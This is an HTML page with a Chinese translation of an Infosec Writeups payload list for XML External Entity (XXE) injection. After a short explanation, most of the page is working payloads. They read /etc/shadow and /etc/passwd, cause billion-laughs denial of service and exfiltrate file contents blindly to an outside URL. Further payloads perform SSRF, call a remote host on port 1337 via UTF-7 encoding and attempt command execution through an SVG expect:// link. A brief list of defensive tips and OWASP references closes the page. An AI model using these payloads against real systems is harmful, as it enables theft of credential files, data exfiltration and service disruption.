<html>
<head>
<title>XML External Entity (XXE) Injection Payload List</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">XML外部实体(XXE)注入有效负载列表</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/xml-external-entity-xxe-injection-payload-list-937d33e5e116?source=collection_archive---------0-----------------------#2019-11-23">https://infosecwriteups.com/xml-external-entity-xxe-injection-payload-list-937d33e5e116?source=collection_archive---------0-----------------------#2019-11-23</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="db1f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在本节中，我们将解释什么是XML外部实体注入，描述一些常见的示例，解释如何发现和利用各种XXE注入，并总结如何防止XXE注入攻击。</p><h2 id="49dc" class="kl km iq bd kn ko kp dn kq kr ks dp kt jy ku kv kw kc kx ky kz kg la lb lc ld bi translated">什么是XML外部实体注入？</h2><p id="f883" class="pw-post-body-paragraph jn jo iq jp b jq le js jt ju lf jw jx jy lg ka kb kc lh ke kf kg li ki kj kk ij bi translated">XML外部实体注入(也称为XXE)是一个web安全漏洞，使得攻击者能够干扰应用程序对XML数据的处理。它通常允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互。</p><p id="2ae2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在某些情况下，攻击者可以升级XXE攻击，通过利用XXE漏洞执行服务器端请求伪造(SSRF)攻击来危害底层服务器或其他后端基础设施。</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/ed22591eea5e9a6cf48ad81cc9903f2f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1200/format:webp/0*s_PHseN9Vi8fhBYU.jpg"/></div></figure><p id="cb48" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">XXE攻击有多种类型:</p><p id="4e31" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">XML外部实体(XXE)注入<a class="ae lr" href="https://www.peerlyst.com/tags/payloads" rel="noopener ugc nofollow" target="_blank">有效负载</a></p><p id="58b6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">XXE:基本XML示例</p><pre class="lk ll lm ln gt ls lt lu lv aw lw bi"><span id="1929" class="kl km iq lt b gy lx ly l lz ma">&lt;!--?xml version="1.0" ?--&gt;<br/>&lt;userInfo&gt;<br/> &lt;firstName&gt;John&lt;/firstName&gt;<br/> &lt;lastName&gt;Doe&lt;/lastName&gt;<br/>&lt;/userInfo&gt;</span></pre><p id="4518" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">XXE:实体示例</p><pre class="lk ll lm ln gt ls lt lu lv aw lw bi"><span id="af80" class="kl km iq lt b gy lx ly l lz ma">&lt;!--?xml version="1.0" ?--&gt;<br/>&lt;!DOCTYPE replace [&lt;!ENTITY example "Doe"&gt; ]&gt;<br/> &lt;userInfo&gt;<br/>  &lt;firstName&gt;John&lt;/firstName&gt;<br/>  &lt;lastName&gt;&amp;example;&lt;/lastName&gt;<br/> &lt;/userInfo&gt;</span></pre><p id="5a6d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">XXE:文件披露</p><pre class="lk ll lm ln gt ls lt lu lv aw lw bi"><span id="ebb5" class="kl km iq lt b gy lx ly l lz ma">&lt;!--?xml version="1.0" ?--&gt;<br/>&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM "file:///etc/shadow"&gt; ]&gt;<br/>&lt;userInfo&gt;<br/> &lt;firstName&gt;John&lt;/firstName&gt;<br/> &lt;lastName&gt;&amp;ent;&lt;/lastName&gt;<br/>&lt;/userInfo&gt;</span></pre><p id="5ac3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">XXE:拒绝服务示例</p><pre class="lk ll lm ln gt ls lt lu lv aw lw bi"><span id="770b" class="kl km iq lt b gy lx ly l lz ma">&lt;!--?xml version="1.0" ?--&gt;<br/>&lt;!DOCTYPE lolz [&lt;!ENTITY lol "lol"&gt;&lt;!ELEMENT lolz (#PCDATA)&gt;<br/>&lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;<br/>&lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt;<br/>&lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;<br/>&lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;<br/>&lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;<br/>&lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;<br/>&lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;<br/>&lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;<br/>&lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;<br/>&lt;tag&gt;&amp;lol9;&lt;/tag&gt;</span></pre><p id="af7f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">XXE:本地文件包含示例</p><pre class="lk ll lm ln gt ls lt lu lv aw lw bi"><span id="8469" class="kl km iq lt b gy lx ly l lz ma">&lt;?xml version="1.0"?&gt;<br/>&lt;!DOCTYPE foo [  <br/>&lt;!ELEMENT foo (#ANY)&gt;<br/>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span></pre><p id="e594" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">XXE:盲本地文件包含示例(当第一个案例没有返回任何内容时。)</p><pre class="lk ll lm ln gt ls lt lu lv aw lw bi"><span id="adb4" class="kl km iq lt b gy lx ly l lz ma">&lt;?xml version="1.0"?&gt;<br/>&lt;!DOCTYPE foo [<br/>&lt;!ELEMENT foo (#ANY)&gt;<br/>&lt;!ENTITY % xxe SYSTEM "file:///etc/passwd"&gt;<br/>&lt;!ENTITY blind SYSTEM "https://www.example.com/?%xxe;"&gt;]&gt;&lt;foo&gt;&amp;blind;&lt;/foo&gt;</span></pre><p id="5ff0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">XXE:访问控制旁路(加载受限资源——PHP示例)</p><pre class="lk ll lm ln gt ls lt lu lv aw lw bi"><span id="daed" class="kl km iq lt b gy lx ly l lz ma">&lt;?xml version="1.0"?&gt;<br/>&lt;!DOCTYPE foo [<br/>&lt;!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php"&gt;]&gt;<br/>&lt;foo&gt;&lt;result&gt;&amp;ac;&lt;/result&gt;&lt;/foo&gt;</span></pre><p id="76eb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">XXE:SSRF(服务器端请求伪造)示例</p><pre class="lk ll lm ln gt ls lt lu lv aw lw bi"><span id="ce52" class="kl km iq lt b gy lx ly l lz ma">&lt;?xml version="1.0"?&gt;<br/>&lt;!DOCTYPE foo [  <br/>&lt;!ELEMENT foo (#ANY)&gt;<br/>&lt;!ENTITY xxe SYSTEM "https://www.example.com/text.txt"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span></pre><p id="f0e8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">XXE:(远程攻击—通过外部Xml包含)示例</p><pre class="lk ll lm ln gt ls lt lu lv aw lw bi"><span id="ac5b" class="kl km iq lt b gy lx ly l lz ma">&lt;?xml version="1.0"?&gt;<br/>&lt;!DOCTYPE lolz [<br/>&lt;!ENTITY test SYSTEM "https://example.com/entity1.xml"&gt;]&gt;<br/>&lt;lolz&gt;&lt;lol&gt;3..2..1...&amp;test&lt;lol&gt;&lt;/lolz&gt;</span></pre><p id="cdbb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">XXE: UTF-7示例</p><pre class="lk ll lm ln gt ls lt lu lv aw lw bi"><span id="c491" class="kl km iq lt b gy lx ly l lz ma">&lt;?xml version="1.0" encoding="UTF-7"?&gt;<br/>+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4<br/>+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+<br/>+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4</span></pre><p id="68b1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">XXE: Base64编码</p><pre class="lk ll lm ln gt ls lt lu lv aw lw bi"><span id="18d5" class="kl km iq lt b gy lx ly l lz ma">&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"&gt; %init; ]&gt;&lt;foo/&gt;</span></pre><p id="818d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">XXE:SOAP里面的XXE示例</p><pre class="lk ll lm ln gt ls lt lu lv aw lw bi"><span id="4ca2" class="kl km iq lt b gy lx ly l lz ma">&lt;soap:Body&gt;<br/>  &lt;foo&gt;<br/>    &lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;<br/>  &lt;/foo&gt;<br/>&lt;/soap:Body&gt;</span></pre><p id="ad1c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">XXE:SVG内部的XXE</p><pre class="lk ll lm ln gt ls lt lu lv aw lw bi"><span id="6251" class="kl km iq lt b gy lx ly l lz ma">&lt;svg  xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"&gt;<br/>    &lt;image xlink:href="expect://ls"&gt;&lt;/image&gt;<br/>&lt;/svg&gt;</span></pre><p id="3ed6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">保护您的web应用免受XXE攻击的几点建议:</p><ul class=""><li id="7b51" class="mb mc iq jp b jq jr ju jv jy md kc me kg mf kk mg mh mi mj bi translated"><strong class="jp ir">解析解析器</strong>:本质上，XXE是一种注入攻击的形式，攻击脆弱的XML解析器。因此，一个基本的防御措施是检查应用程序的XML解析库中可能被误用的XML特性，并禁用它们。特别是，禁用dtd(外部实体)，如下所述。另外，检查您的XML处理器是否打了补丁。</li><li id="2baf" class="mb mc iq jp b jq mk ju ml jy mm kc mn kg mo kk mg mh mi mj bi translated"><strong class="jp ir">验证输入:</strong>验证文件上传经过XSD验证，并且只允许白名单中的URL。</li><li id="7817" class="mb mc iq jp b jq mk ju ml jy mm kc mn kg mo kk mg mh mi mj bi translated">通过代码进行测试:不要低估手工代码评审。通过API调用识别和测试XXE攻击。在XML解析器解析用户输入之前对其进行验证。</li><li id="f09d" class="mb mc iq jp b jq mk ju ml jy mm kc mn kg mo kk mg mh mi mj bi translated"><strong class="jp ir">记住基础知识</strong>:确保网络监控工具和应用防火墙得到更新。</li></ul><h2 id="f563" class="kl km iq bd kn ko kp dn kq kr ks dp kt jy ku kv kw kc kx ky kz kg la lb lc ld bi translated">参考资料:</h2><p id="2185" class="pw-post-body-paragraph jn jo iq jp b jq le js jt ju lf jw jx jy lg ka kb kc lh ke kf kg li ki kj kk ij bi translated">👉<a class="ae lr" href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing" rel="noopener ugc nofollow" target="_blank"> XML外部实体(XXE)处理</a></p><p id="2dde" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">👉<a class="ae lr" href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" rel="noopener ugc nofollow" target="_blank"> XML外部实体预防备忘单</a></p><p id="63db" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">👉<a class="ae lr" href="https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008)" rel="noopener ugc nofollow" target="_blank">XML注入测试(OTG-INPVAL-008) </a></p><p id="aa11" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi">—</p><p id="353f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">来源:https://github.com/payloadbox/xxe-injection-payload-list</p></div><div class="ab cl mp mq hu mr" role="separator"><span class="ms bw bk mt mu mv"/><span class="ms bw bk mt mu mv"/><span class="ms bw bk mt mu"/></div><div class="ij ik il im in"><h2 id="e7e0" class="kl km iq bd kn ko kp dn kq kr ks dp kt jy ku kv kw kc kx ky kz kg la lb lc ld bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae lr" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>